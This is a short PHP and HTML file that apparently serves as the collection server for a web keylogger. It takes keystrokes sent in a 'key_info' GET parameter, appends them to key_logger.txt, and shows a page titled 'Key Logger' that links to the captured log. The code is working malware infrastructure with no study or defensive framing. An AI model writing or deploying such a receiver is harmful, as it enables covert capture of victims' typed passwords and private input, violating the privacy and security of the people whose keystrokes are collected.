<?php

$path_to_file_text = "./key_logger.txt";

if(isset($_GET['key_info'])){

    $key = urldecode($_GET['key_info']);

    file_put_contents(
        $path_to_file_text,
        $key . "",
        FILE_APPEND
    );

}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Key Logger</title>
</head>
<body>
    <h1>Key logger</h1>

    <a href="./key_logger.txt" target="_blank">Go to key_logger.txt</a>
</body>
</html>